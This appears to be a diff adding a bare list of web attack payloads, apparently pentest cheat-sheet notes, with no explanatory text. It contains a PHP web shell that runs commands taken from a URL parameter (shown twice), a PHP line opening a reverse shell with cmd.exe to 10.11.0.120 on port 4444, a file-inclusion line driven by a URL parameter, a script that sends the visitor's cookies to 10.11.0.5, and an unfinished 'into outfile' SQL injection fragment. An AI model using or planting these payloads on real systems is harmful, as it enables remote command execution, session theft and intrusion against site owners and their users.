@@ -1,0 +1,10 @@
+<?php echo shell_exec ($_GET['cmd']);?>
+<?php echo shell_exec("evil.exe -nv 10.11.0.120 4444 -e cmd.exe");?>
+<?php include $_GET['inc']; ?>
+<script>
+new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie;
+</script>
+
+<?php echo shell_exec($_GET['cmd']);?>
+
+into outfile 
